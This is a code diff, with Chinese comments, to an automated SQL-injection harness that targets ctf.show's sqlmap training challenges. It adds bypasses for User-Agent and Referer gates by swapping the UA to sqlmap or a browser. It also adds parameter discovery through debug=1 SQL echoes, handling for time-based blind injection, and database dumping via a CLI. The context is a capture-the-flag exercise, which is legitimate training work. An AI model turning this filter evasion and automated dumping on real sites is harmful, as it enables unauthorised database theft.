@@ -50,6 +50,11 @@ def http_get(url: str, cookie: str, headers: dict | None = None) -> tuple[int, s
         return e.code, e.read().decode("utf-8", "replace")
 
 
+def _is_gate(body: str) -> bool:
+    """UA/Referer 网关文案（JSON 中文转义按原文判断）。"""
+    return "sqlmap" in body and ("\\u7075\\u9b42" in body or "灵魂" in body)
+
+
 def _gate_headers(body: str, headers: dict) -> dict:
     """ctf.show sqlmap 模块常见网关：先查 UA，再查 Referer。
 
@@ -57,7 +62,14 @@ def _gate_headers(body: str, headers: dict) -> dict:
     「你都不是从ctf.show来的」→ 要求 Referer 指向 ctf.show。
     """
     h = dict(headers)
-    if "sqlmap" in body and "User-Agent" not in h:
+    if _is_gate(body):
+        ua = h.get("User-Agent", "")
+        if "sqlmap" in ua:
+            # 反向网关（web214）：带 sqlmap UA 才被拦，翻转为浏览器 UA
+            h["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AutoSQLi"
+        elif not ua:
+            h["User-Agent"] = "sqlmap/1.5.12#stable (http://sqlmap.org)"
+    elif "sqlmap" in body and "User-Agent" not in h:
         h["User-Agent"] = "sqlmap/1.5.12#stable (http://sqlmap.org)"
     if "ctf.show" in body and "Referer" not in h:
         h["Referer"] = "https://ctf.show/"
@@ -79,19 +91,26 @@ def container_sid(page_url: str) -> str:
 
 
 def probe_json(url: str, method: str, param: str, cookie: str,
-               headers: dict, stage: str = "") -> tuple[bool, dict, str]:
+               headers: dict, stage: str = "",
+               extra_fields: dict | None = None) -> tuple[bool, dict, str]:
     """探测接口是否返回 {"code":..}；被 UA/Referer 网关拦住时自动补头重试。"""
     body = ""
     val = apply_encoder("1", LAST.get("encoder", ""))
-    for _ in range(3):
+    for _ in range(4):
         if stage:
             http_get(stage, cookie, headers)      # 刷新一次性 token（web205）
         if method.upper() == "GET":
             s, body = http_get(f"{url}?{param}={val}", cookie, headers)
         else:
-            s, body = http_post(url, {param: val}, cookie, headers, method=method)
+            data = {param: val}
+            data.update(extra_fields or {})
+            s, body = http_post(url, data, cookie, headers, method=method)
         if s == 200 and body.lstrip().startswith('{"code"') \
                 and not _is_auth_fail(body):
+            return True, headers, body
+        if s == 200 and not _is_gate(body) and not _is_auth_fail(body) \
+                and "<html" not in body.lower():
+            # 时间盲注族（web214）：200 空体即正常（无回显，仅延时差异）
             return True, headers, body
         new = _gate_headers(body, headers)
         if new == headers:
@@ -156,6 +175,8 @@ def resolve_entry(base: str, name: str, cookie: str) -> dict:
                     key=lambda p: -int(re.search(r"(\d+)\.php", p).group(1)))
 
     last_err = "无候选页面"
+    # 参数名候选：无表单页（时间盲注族）的真实参数只能试探/debug 回显发现
+    param_cands = ["id", "ip", "username"]
     for page in pages:
         s, html = http_get(base + page, cookie)
         if s != 200:
@@ -198,6 +219,25 @@ def resolve_entry(base: str, name: str, cookie: str) -> dict:
             if ok:
                 return _result(base + page, param, src_method, html, fields, hdrs)
             last_err = f"{page} 自提交页探测失败"
+            # 时间盲注族（web214）：页面即接口或走 api/、200 空体。
+            # debug=1 会回显 SQL，可从中确认真实参数名（优先，最可靠）
+            api_cands = [urllib.parse.urljoin(base, "api/index.php"),
+                         urllib.parse.urljoin(base, "api/")]
+            for u in api_cands:
+                for pc in param_cands:
+                    ok, hdrs, body = probe_json(u, "POST", pc, cookie, {},
+                                                extra_fields={"debug": "1"})
+                    if not ok:
+                        continue
+                    m2 = re.search(r"where\s+(\w+)\s*=", body)
+                    if m2:
+                        return _result(u, m2.group(1), "POST", html,
+                                       {"debug": "0"}, hdrs)
+                # debug 无回显时退回空体接受（时间盲注族无回显属正常）
+                for pc in param_cands:
+                    ok, hdrs, body = probe_json(u, "POST", pc, cookie, {}, {})
+                    if ok:
+                        return _result(u, pc, "POST", html, {}, hdrs)
             continue
         action = urllib.parse.urljoin(base + page, am.group(1) or (base + page))
         # 页面写的 action 不一定真实可用（web174 写 api/v2.php，真接口是 api/v4.php），
@@ -267,7 +307,7 @@ def stream_cli(url: str, param: str, method: str, fields: dict, headers: dict,
                budget: int, verbose: bool, log_path: str) -> tuple[int, str]:
     cmd = [sys.executable, "-u", "-m", "autosqli.cli", "-u", url, "-p", param,
            "--dump", "--fast", "--max-seconds", str(budget), "--timeout", "12",
-           "--workers", "8", "--max-rows", "60"]
+           "--workers", "8", "--max-rows", "60", "--time-sec", "1"]
     if method.upper() != "GET":
         data = [f"{param}=1"] + [f"{k}={v}" for k, v in (fields or {}).items()]
         cmd += ["--method", method.upper(), "--data", *data]
